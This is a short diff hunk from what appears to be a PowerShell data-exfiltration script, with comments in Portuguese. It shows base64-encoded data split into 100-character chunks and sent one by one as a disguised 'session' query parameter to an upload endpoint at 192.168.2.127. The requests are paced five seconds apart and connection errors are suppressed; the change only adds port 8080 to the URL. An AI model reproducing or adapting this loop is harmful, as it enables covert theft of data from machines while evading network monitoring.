@@ -35,7 +35,7 @@ $chunks = ($base64 -split '(.{100})' | ? { $_ -ne "" })
 # 4. Enviar cada bloco em uma requisição com pausa de 5 segundos
 foreach ($chunk in $chunks) {
     try {
-        Invoke-WebRequest -Uri "http://192.168.2.127/api/upload?session=$chunk" -UseBasicParsing -ErrorAction Stop | Out-Null
+        Invoke-WebRequest -Uri "http://192.168.2.127:8080/api/upload?session=$chunk" -UseBasicParsing -ErrorAction Stop | Out-Null
     }
     catch {
         # Ignora qualquer erro de conexão
